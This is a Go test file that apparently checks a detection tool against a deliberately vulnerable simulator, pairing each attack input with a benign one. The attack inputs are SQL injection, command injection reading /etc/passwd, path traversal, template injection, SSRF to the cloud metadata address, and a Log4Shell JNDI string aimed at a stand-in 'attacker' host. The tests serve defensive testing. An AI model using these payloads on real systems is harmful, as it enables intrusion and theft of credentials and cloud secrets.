package usecase_test

import (
	"context"
	"testing"

	"github.com/m-mizutani/gt"
	"github.com/m-mizutani/semgate-example/pkg/usecase"
)

func newSimulator(t *testing.T) *usecase.Simulator {
	t.Helper()
	sim, err := usecase.NewSimulator()
	gt.NoError(t, err)
	t.Cleanup(func() { _ = sim.Close() })
	return sim
}

func TestSimulator_Login(t *testing.T) {
	sim := newSimulator(t)
	ctx := context.Background()

	fired := sim.Login(ctx, "admin' OR '1'='1", "x")
	gt.Bool(t, fired.Verdict.Fired).True()
	gt.Bool(t, fired.Authenticated).True()
	gt.Number(t, len(fired.Users)).Greater(0)

	benign := sim.Login(ctx, "alice", "wrong")
	gt.Bool(t, benign.Verdict.Fired).False()
	gt.Bool(t, benign.Authenticated).False()
	gt.Number(t, len(benign.Users)).Equal(0)
}

func TestSimulator_Ping(t *testing.T) {
	sim := newSimulator(t)
	ctx := context.Background()

	fired := sim.Ping(ctx, "example.com; cat /etc/passwd")
	gt.Bool(t, fired.Verdict.Fired).True()
	gt.String(t, fired.Output).IsNotEmpty()

	benign := sim.Ping(ctx, "example.com")
	gt.Bool(t, benign.Verdict.Fired).False()
	gt.String(t, benign.Output).Contains("packets transmitted")
}

func TestSimulator_ReadFile(t *testing.T) {
	sim := newSimulator(t)
	ctx := context.Background()

	fired := sim.ReadFile(ctx, "../../../etc/passwd")
	gt.Bool(t, fired.Verdict.Fired).True()
	gt.Bool(t, fired.Found).True()
	gt.String(t, fired.Content).IsNotEmpty()

	benign := sim.ReadFile(ctx, "report.txt")
	gt.Bool(t, benign.Verdict.Fired).False()
	gt.Bool(t, benign.Found).True()

	missing := sim.ReadFile(ctx, "nope.txt")
	gt.Bool(t, missing.Verdict.Fired).False()
	gt.Bool(t, missing.Found).False()
}

func TestSimulator_Greet(t *testing.T) {
	sim := newSimulator(t)
	ctx := context.Background()

	fired := sim.Greet(ctx, "{{7*7}}")
	gt.Bool(t, fired.Verdict.Fired).True()
	gt.String(t, fired.Rendered).Contains("49")

	benign := sim.Greet(ctx, "Alice")
	gt.Bool(t, benign.Verdict.Fired).False()
	gt.String(t, benign.Rendered).Equal("Hello, Alice!")
}

func TestSimulator_Fetch(t *testing.T) {
	sim := newSimulator(t)
	ctx := context.Background()

	fired := sim.Fetch(ctx, "http://169.254.169.254/latest/meta-data/")
	gt.Bool(t, fired.Verdict.Fired).True()
	gt.String(t, fired.Body).IsNotEmpty()

	benign := sim.Fetch(ctx, "https://example.com")
	gt.Bool(t, benign.Verdict.Fired).False()
}

func TestSimulator_Track(t *testing.T) {
	sim := newSimulator(t)
	ctx := context.Background()

	fired := sim.Track(ctx, "${jndi:ldap://attacker/x}")
	gt.Bool(t, fired.Verdict.Fired).True()
	gt.String(t, fired.Logged).IsNotEmpty()

	benign := sim.Track(ctx, "Mozilla/5.0")
	gt.Bool(t, benign.Verdict.Fired).False()
}
